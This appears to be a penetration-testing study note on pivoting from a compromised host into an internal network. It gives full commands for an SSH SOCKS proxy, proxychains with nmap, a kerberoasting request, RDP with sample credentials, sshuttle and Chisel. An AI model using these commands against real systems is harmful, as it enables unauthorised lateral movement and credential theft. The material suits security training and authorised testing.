Create an SSH connection to the compromised machine:
```bash
ssh -f -N -D 9050 root@compromised-host
```
Args:
`-f`: Requests ssh to go to background
`-N`: Do not execute a remote command. This is useful for just forwarding ports.
`-D 9050`: Specifies  a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side \[...]. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  \[...] ssh will act as a SOCKS server.

# Proxychains

**Why port 9050?**
To execute commands on network 2 via the established SSH connection, we are going to use the program *proxychains*.
If we take a look at the last line of */etc/proxychains4.conf* is says:
`socks4  127.0.0.1 9050`
That means that *proxychains* per default is connecting to a socks4 proxy on port 9050.

>[!Info] Proxychains
>*Proxychains* forces any tcp connection made by any given tcp client to follow through proxy.

We use *proxychains* with *nmap* to scan a machine on network 2 via the SSH socks proxy:
```bash
proxychains nmap -p 443 10.10.10.10.3
```

---

We can also do a *kerberoasting* attack:
```bash
proxychains GetUserSPNs.py MARVEL.local/frank:Password1 -dc-ip 10.10.10.10.3 -request
```

---

Or we can RDP to a machine:
```bash
proxychains xfreerdp /u:administrator /p:'Password123' /v:10.10.10.10.3
```

---

Or we can use Firefox access a web application on the remote machine on network 2:
```bash
proxychains firefox
```

# sshuttle

>[!Info] sshuttle
>sshuttle allows you to create a VPN connection from your machine to any remote server that you can connect to via ssh.

Create a VPN connection:
```bash
sshuttle -r root@compromised-host 10.10.10.0/24
```
Args:
`-r`: The remote hostname and optional username and ssh port number to use for connecting to the remote server.
`10.10.10.0/24`: A subnet to route over the VPN

As soon as the VPN connection is established you can run commands as if you were on that remote subnet:
E.g. run *nmap*:
```bash
nmap -p 443 10.10.10.10.3
```

# Chisel

Another tool is: https://github.com/jpillora/chisel

>[!Info]
>Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.

![[Pasted image 20240326095229.png]]